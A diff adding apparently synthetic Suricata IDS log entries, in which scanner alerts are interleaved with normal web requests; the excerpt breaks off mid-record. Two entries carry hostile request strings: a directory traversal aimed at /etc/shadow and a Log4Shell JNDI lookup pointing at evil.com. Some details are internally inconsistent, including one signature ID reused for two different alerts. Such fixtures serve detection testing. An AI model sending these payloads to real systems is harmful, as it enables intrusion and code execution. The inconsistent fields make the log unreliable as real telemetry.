+        "timestamp": "2025-02-23T10:15:48.130726+0300",
+        "flow_id": 1829127292340130,
+        "pcap_cnt": 140130,
+        "event_type": "alert",
+        "src_ip": "192.168.9.31",
+        "src_port": 38918,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "alert": {
+            "action": "allowed",
+            "gid": 1,
+            "signature_id": 2025594,
+            "rev": 7,
+            "signature": "ET WEB_SERVER WordPress Vulnerability Scanner",
+            "category": "Attempted Information Leak",
+            "severity": 2
+        },
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/wp-content/themes/twentyseventeen/",
+            "http_user_agent": "WPScan/3.8",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 404,
+            "length": 209
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 4,
+            "pkts_toclient": 4,
+            "bytes_toserver": 589,
+            "bytes_toclient": 671,
+            "start": "2025-02-23T10:15:47.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:15:49.130726+0300",
+        "flow_id": 1829127292340131,
+        "pcap_cnt": 140131,
+        "event_type": "http",
+        "src_ip": "192.168.1.145",
+        "src_port": 55138,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/images/banner.jpg",
+            "http_user_agent": "Mozilla/5.0 (iPad; CPU OS 15_0 like Mac OS X) AppleWebKit/605.1.15",
+            "http_content_type": "image/jpeg",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 200,
+            "length": 45231
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 8,
+            "pkts_toclient": 18,
+            "bytes_toserver": 1345,
+            "bytes_toclient": 46789,
+            "start": "2025-02-23T10:15:48.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:15:50.130726+0300",
+        "flow_id": 1829127292340132,
+        "pcap_cnt": 140132,
+        "event_type": "alert",
+        "src_ip": "192.168.7.221",
+        "src_port": 55207,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "alert": {
+            "action": "allowed",
+            "gid": 1,
+            "signature_id": 2013024,
+            "rev": 11,
+            "signature": "ET SCAN Acunetix User Agent",
+            "category": "Attempted Information Leak",
+            "severity": 2
+        },
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/backup.zip",
+            "http_user_agent": "Mozilla/5.0 (compatible; Acunetix)",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 404,
+            "length": 209
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 4,
+            "pkts_toclient": 4,
+            "bytes_toserver": 556,
+            "bytes_toclient": 671,
+            "start": "2025-02-23T10:15:49.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:15:51.130726+0300",
+        "flow_id": 1829127292340133,
+        "pcap_cnt": 140133,
+        "event_type": "http",
+        "src_ip": "192.168.1.148",
+        "src_port": 55139,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/blog/",
+            "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 200,
+            "length": 15678
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 6,
+            "pkts_toclient": 8,
+            "bytes_toserver": 923,
+            "bytes_toclient": 16234,
+            "start": "2025-02-23T10:15:50.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:15:52.130726+0300",
+        "flow_id": 1829127292340134,
+        "pcap_cnt": 140134,
+        "event_type": "alert",
+        "src_ip": "192.168.9.31",
+        "src_port": 38919,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "alert": {
+            "action": "allowed",
+            "gid": 1,
+            "signature_id": 2034921,
+            "rev": 5,
+            "signature": "ET WEB_SERVER Spring Boot Actuator Scan",
+            "category": "Attempted Information Leak",
+            "severity": 2
+        },
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/actuator/env",
+            "http_user_agent": "Mozilla/5.0 (compatible; SpringScan/1.0)",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 404,
+            "length": 209
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 4,
+            "pkts_toclient": 4,
+            "bytes_toserver": 567,
+            "bytes_toclient": 671,
+            "start": "2025-02-23T10:15:51.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:15:53.130726+0300",
+        "flow_id": 1829127292340135,
+        "pcap_cnt": 140135,
+        "event_type": "http",
+        "src_ip": "192.168.7.221",
+        "src_port": 55140,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/products/item2",
+            "http_user_agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 200,
+            "length": 7890
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 5,
+            "pkts_toclient": 7,
+            "bytes_toserver": 834,
+            "bytes_toclient": 8234,
+            "start": "2025-02-23T10:15:52.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:15:54.130726+0300",
+        "flow_id": 1829127292340136,
+        "pcap_cnt": 140136,
+        "event_type": "alert",
+        "src_ip": "192.168.7.221",
+        "src_port": 55208,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "alert": {
+            "action": "allowed",
+            "gid": 1,
+            "signature_id": 2002664,
+            "rev": 10,
+            "signature": "ET SCAN Nessus User Agent",
+            "category": "Attempted Information Leak",
+            "severity": 2
+        },
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/test.php",
+            "http_user_agent": "Mozilla/4.75 [en] (X11, U; Nessus)",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 404,
+            "length": 209
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 4,
+            "pkts_toclient": 4,
+            "bytes_toserver": 545,
+            "bytes_toclient": 671,
+            "start": "2025-02-23T10:15:53.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:15:55.130726+0300",
+        "flow_id": 1829127292340137,
+        "pcap_cnt": 140137,
+        "event_type": "http",
+        "src_ip": "192.168.9.31",
+        "src_port": 55141,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/js/script.js",
+            "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "http_content_type": "application/javascript",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 200,
+            "length": 23456
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 7,
+            "pkts_toclient": 10,
+            "bytes_toserver": 1123,
+            "bytes_toclient": 24123,
+            "start": "2025-02-23T10:15:54.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:15:56.130726+0300",
+        "flow_id": 1829127292340138,
+        "pcap_cnt": 140138,
+        "event_type": "alert",
+        "src_ip": "192.168.9.31",
+        "src_port": 38920,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "alert": {
+            "action": "allowed",
+            "gid": 1,
+            "signature_id": 2010935,
+            "rev": 12,
+            "signature": "ET SCAN Nikto User Agent",
+            "category": "Attempted Information Leak",
+            "severity": 2
+        },
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/drupal/CHANGELOG.txt",
+            "http_user_agent": "Mozilla/5.0 (Nikto/2.5)",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 404,
+            "length": 209
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 4,
+            "pkts_toclient": 4,
+            "bytes_toserver": 578,
+            "bytes_toclient": 671,
+            "start": "2025-02-23T10:15:55.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:15:57.130726+0300",
+        "flow_id": 1829127292340139,
+        "pcap_cnt": 140139,
+        "event_type": "alert",
+        "src_ip": "192.168.1.155",
+        "src_port": 55142,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "alert": {
+            "action": "allowed",
+            "gid": 1,
+            "signature_id": 2101979,
+            "rev": 6,
+            "signature": "GPL WEB_SERVER perl post attempt",
+            "category": "Web Application Attack",
+            "severity": 1
+            },
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/perl",
+            "http_user_agent": "Mozilla/5.0 (iPad; CPU OS 15_0 like Mac OS X) AppleWebKit/605.1.15",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 404,
+            "length": 203
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 6,
+            "pkts_toclient": 7,
+            "bytes_toserver": 867,
+            "bytes_toclient": 12987,
+            "start": "2025-02-23T10:15:56.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:15:58.130726+0300",
+        "flow_id": 1829127292340140,
+        "pcap_cnt": 140140,
+        "event_type": "alert",
+        "src_ip": "192.168.7.221",
+        "src_port": 55209,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "alert": {
+            "action": "allowed",
+            "gid": 1,
+            "signature_id": 2029112,
+            "rev": 6,
+            "signature": "ET WEB_SERVER Joomla Vulnerability Scanner",
+            "category": "Attempted Information Leak",
+            "severity": 2
+        },
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/joomla/language/",
+            "http_user_agent": "Mozilla/5.0 (compatible; JoomlaScan/2.0)",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 404,
+            "length": 209
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 4,
+            "pkts_toclient": 4,
+            "bytes_toserver": 589,
+            "bytes_toclient": 671,
+            "start": "2025-02-23T10:15:57.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:15:59.130726+0300",
+        "flow_id": 1829127292340141,
+        "pcap_cnt": 140141,
+        "event_type": "http",
+        "src_ip": "192.168.1.158",
+        "src_port": 55143,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/fonts/font.woff2",
+            "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
+            "http_content_type": "font/woff2",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 200,
+            "length": 23456
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 4,
+            "pkts_toclient": 8,
+            "bytes_toserver": 678,
+            "bytes_toclient": 24123,
+            "start": "2025-02-23T10:15:58.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:16:00.130726+0300",
+        "flow_id": 1829127292340142,
+        "pcap_cnt": 140142,
+        "event_type": "alert",
+        "src_ip": "192.168.9.31",
+        "src_port": 38921,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "alert": {
+            "action": "allowed",
+            "gid": 1,
+            "signature_id": 2002911,
+            "rev": 9,
+            "signature": "ET SCAN OpenVAS User Agent",
+            "category": "Attempted Information Leak",
+            "severity": 2
+        },
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/ecp/",
+            "http_user_agent": "Mozilla/5.0 (compatible; OpenVAS)",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 404,
+            "length": 209
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 4,
+            "pkts_toclient": 4,
+            "bytes_toserver": 534,
+            "bytes_toclient": 671,
+            "start": "2025-02-23T10:15:59.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:16:01.130726+0300",
+        "flow_id": 1829127292340143,
+        "pcap_cnt": 140143,
+        "event_type": "http",
+        "src_ip": "192.168.1.160",
+        "src_port": 55144,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/contact.html",
+            "http_user_agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 200,
+            "length": 8923
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 5,
+            "pkts_toclient": 6,
+            "bytes_toserver": 734,
+            "bytes_toclient": 9234,
+            "start": "2025-02-23T10:16:00.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:16:02.130726+0300",
+        "flow_id": 1829127292340144,
+        "pcap_cnt": 140144,
+        "event_type": "alert",
+        "src_ip": "192.168.7.221",
+        "src_port": 55210,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "alert": {
+            "action": "allowed",
+            "gid": 1,
+            "signature_id": 2022847,
+            "rev": 8,
+            "signature": "ET WEB_SERVER Possible Directory Traversal",
+            "category": "Attempted Information Leak",
+            "severity": 2
+        },
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/../../../etc/shadow",
+            "http_user_agent": "sqlmap/1.6",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 404,
+            "length": 209
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 4,
+            "pkts_toclient": 4,
+            "bytes_toserver": 601,
+            "bytes_toclient": 671,
+            "start": "2025-02-23T10:16:01.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:16:03.130726+0300",
+        "flow_id": 1829127292340145,
+        "pcap_cnt": 140145,
+        "event_type": "http",
+        "src_ip": "192.168.1.162",
+        "src_port": 55145,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/about.html",
+            "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 200,
+            "length": 5678
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 5,
+            "pkts_toclient": 6,
+            "bytes_toserver": 745,
+            "bytes_toclient": 5987,
+            "start": "2025-02-23T10:16:02.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:16:04.130726+0300",
+        "flow_id": 1829127292340146,
+        "pcap_cnt": 140146,
+        "event_type": "alert",
+        "src_ip": "192.168.9.31",
+        "src_port": 38922,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "alert": {
+            "action": "allowed",
+            "gid": 1,
+            "signature_id": 2025594,
+            "rev": 7,
+            "signature": "ET WEB_SERVER WordPress Vulnerability Scanner",
+            "category": "Attempted Information Leak",
+            "severity": 2
+        },
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/wp-includes/",
+            "http_user_agent": "WPScan/3.8",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 404,
+            "length": 209
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 4,
+            "pkts_toclient": 4,
+            "bytes_toserver": 556,
+            "bytes_toclient": 671,
+            "start": "2025-02-23T10:16:03.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:16:05.130726+0300",
+        "flow_id": 1829127292340147,
+        "pcap_cnt": 140147,
+        "event_type": "http",
+        "src_ip": "192.168.1.165",
+        "src_port": 55146,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/api/v1/users",
+            "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
+            "http_content_type": "application/json",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 200,
+            "length": 34567
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 8,
+            "pkts_toclient": 10,
+            "bytes_toserver": 1245,
+            "bytes_toclient": 35234,
+            "start": "2025-02-23T10:16:04.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:16:06.130726+0300",
+        "flow_id": 1829127292340148,
+        "pcap_cnt": 140148,
+        "event_type": "alert",
+        "src_ip": "192.168.7.221",
+        "src_port": 55211,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "alert": {
+            "action": "allowed",
+            "gid": 1,
+            "signature_id": 2013024,
+            "rev": 11,
+            "signature": "ET SCAN Acunetix User Agent",
+            "category": "Attempted Information Leak",
+            "severity": 2
+        },
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/vendor/phpunit/phpunit.xml",
+            "http_user_agent": "Mozilla/5.0 (compatible; Acunetix)",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 404,
+            "length": 209
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 4,
+            "pkts_toclient": 4,
+            "bytes_toserver": 589,
+            "bytes_toclient": 671,
+            "start": "2025-02-23T10:16:05.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:16:07.130726+0300",
+        "flow_id": 1829127292340149,
+        "pcap_cnt": 140149,
+        "event_type": "http",
+        "src_ip": "192.168.1.168",
+        "src_port": 55147,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/images/icon.svg",
+            "http_user_agent": "Mozilla/5.0 (iPad; CPU OS 15_0 like Mac OS X) AppleWebKit/605.1.15",
+            "http_content_type": "image/svg+xml",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 200,
+            "length": 1234
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 4,
+            "pkts_toclient": 5,
+            "bytes_toserver": 645,
+            "bytes_toclient": 1567,
+            "start": "2025-02-23T10:16:06.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:16:08.130726+0300",
+        "flow_id": 1829127292340150,
+        "pcap_cnt": 140150,
+        "event_type": "alert",
+        "src_ip": "192.168.9.31",
+        "src_port": 38923,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "alert": {
+            "action": "allowed",
+            "gid": 1,
+            "signature_id": 2034921,
+            "rev": 5,
+            "signature": "ET WEB_SERVER Spring Boot Actuator Scan",
+            "category": "Attempted Information Leak",
+            "severity": 2
+        },
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/actuator/metrics",
+            "http_user_agent": "Mozilla/5.0 (compatible; SpringScan/1.0)",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 404,
+            "length": 209
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 4,
+            "pkts_toclient": 4,
+            "bytes_toserver": 567,
+            "bytes_toclient": 671,
+            "start": "2025-02-23T10:16:07.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:16:09.130726+0300",
+        "flow_id": 1829127292340151,
+        "pcap_cnt": 140151,
+        "event_type": "http",
+        "src_ip": "192.168.1.170",
+        "src_port": 55148,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/blog/post2",
+            "http_user_agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 200,
+            "length": 9876
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 5,
+            "pkts_toclient": 7,
+            "bytes_toserver": 856,
+            "bytes_toclient": 10234,
+            "start": "2025-02-23T10:16:08.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:16:10.130726+0300",
+        "flow_id": 1829127292340152,
+        "pcap_cnt": 140152,
+        "event_type": "alert",
+        "src_ip": "192.168.7.221",
+        "src_port": 55212,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "alert": {
+            "action": "allowed",
+            "gid": 1,
+            "signature_id": 2002664,
+            "rev": 10,
+            "signature": "ET SCAN Nessus User Agent",
+            "category": "Attempted Information Leak",
+            "severity": 2
+        },
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/solr/admin/",
+            "http_user_agent": "Mozilla/4.75 [en] (X11, U; Nessus)",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 404,
+            "length": 209
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 4,
+            "pkts_toclient": 4,
+            "bytes_toserver": 556,
+            "bytes_toclient": 671,
+            "start": "2025-02-23T10:16:09.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:16:11.130726+0300",
+        "flow_id": 1829127292340153,
+        "pcap_cnt": 140153,
+        "event_type": "http",
+        "src_ip": "192.168.1.172",
+        "src_port": 55149,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/search?q=hello",
+            "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 200,
+            "length": 5678
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 5,
+            "pkts_toclient": 6,
+            "bytes_toserver": 756,
+            "bytes_toclient": 6123,
+            "start": "2025-02-23T10:16:10.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:16:12.130726+0300",
+        "flow_id": 1829127292340154,
+        "pcap_cnt": 140154,
+        "event_type": "alert",
+        "src_ip": "192.168.9.31",
+        "src_port": 38924,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "alert": {
+            "action": "allowed",
+            "gid": 1,
+            "signature_id": 2010935,
+            "rev": 12,
+            "signature": "ET SCAN Nikto User Agent",
+            "category": "Attempted Information Leak",
+            "severity": 2
+        },
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/zabbix/",
+            "http_user_agent": "Mozilla/5.0 (Nikto/2.5)",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 404,
+            "length": 209
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 4,
+            "pkts_toclient": 4,
+            "bytes_toserver": 545,
+            "bytes_toclient": 671,
+            "start": "2025-02-23T10:16:11.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:16:13.130726+0300",
+        "flow_id": 1829127292340155,
+        "pcap_cnt": 140155,
+        "event_type": "http",
+        "src_ip": "192.168.1.175",
+        "src_port": 55150,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/assets/css/main.css",
+            "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
+            "http_content_type": "text/css",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 200,
+            "length": 7890
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 6,
+            "pkts_toclient": 7,
+            "bytes_toserver": 923,
+            "bytes_toclient": 8234,
+            "start": "2025-02-23T10:16:12.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:16:14.130726+0300",
+        "flow_id": 1829127292340156,
+        "pcap_cnt": 140156,
+        "event_type": "alert",
+        "src_ip": "192.168.7.221",
+        "src_port": 55213,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "alert": {
+            "action": "allowed",
+            "gid": 1,
+            "signature_id": 2022847,
+            "rev": 8,
+            "signature": "ET WEB_SERVER Log4Shell JNDI Injection Attempt",
+            "category": "Attempted Information Leak",
+            "severity": 2
+        },
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/webapp/${jndi:ldap://evil.com/exp}",
+            "http_user_agent": "Mozilla/5.0 (compatible; Nmap Scripting Engine)",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 404,
+            "length": 209
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 4,
+            "pkts_toclient": 4,
+            "bytes_toserver": 623,
+            "bytes_toclient": 671,
+            "start": "2025-02-23T10:16:13.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:16:15.130726+0300",
+        "flow_id": 1829127292340157,
+        "pcap_cnt": 140157,
+        "event_type": "http",
+        "src_ip": "192.168.1.178",
+        "src_port": 55151,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/products/item3",
+            "http_user_agent": "Mozilla/5.0 (iPad; CPU OS 15_0 like Mac OS X) AppleWebKit/605.1.15",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 200,
+            "length": 6789
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 5,
+            "pkts_toclient": 7,
+            "bytes_toserver": 834,
+            "bytes_toclient": 7123,
+            "start": "2025-02-23T10:16:14.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:16:16.130726+0300",
+        "flow_id": 1829127292340158,
+        "pcap_cnt": 140158,
+        "event_type": "alert",
+        "src_ip": "192.168.9.31",
+        "src_port": 38925,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "alert": {
+            "action": "allowed",
+            "gid": 1,
+            "signature_id": 2002911,
+            "rev": 9,
+            "signature": "ET SCAN OpenVAS User Agent",
+            "category": "Attempted Information Leak",
+            "severity": 2
+        },
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/jmx-console/",
+            "http_user_agent": "Mozilla/5.0 (compatible; OpenVAS)",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 404,
+            "length": 209
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 4,
+            "pkts_toclient": 4,
+            "bytes_toserver": 556,
+            "bytes_toclient": 671,
+            "start": "2025-02-23T10:16:15.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:16:17.130726+0300",
+        "flow_id": 1829127292340159,
+        "pcap_cnt": 140159,
+        "event_type": "http",
+        "src_ip": "192.168.1.180",
+        "src_port": 55152,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/category/sports",
+            "http_user_agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 200,
+            "length": 11234
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 6,
+            "pkts_toclient": 8,
+            "bytes_toserver": 891,
+            "bytes_toclient": 11890,
+            "start": "2025-02-23T10:16:16.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:16:18.130726+0300",
+        "flow_id": 1829127292340160,
+        "pcap_cnt": 140160,
+        "event_type": "alert",
+        "src_ip": "192.168.7.221",
+        "src_port": 55214,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "alert": {
+            "action": "allowed",
+            "gid": 1,
+            "signature_id": 2029112,
+            "rev": 6,
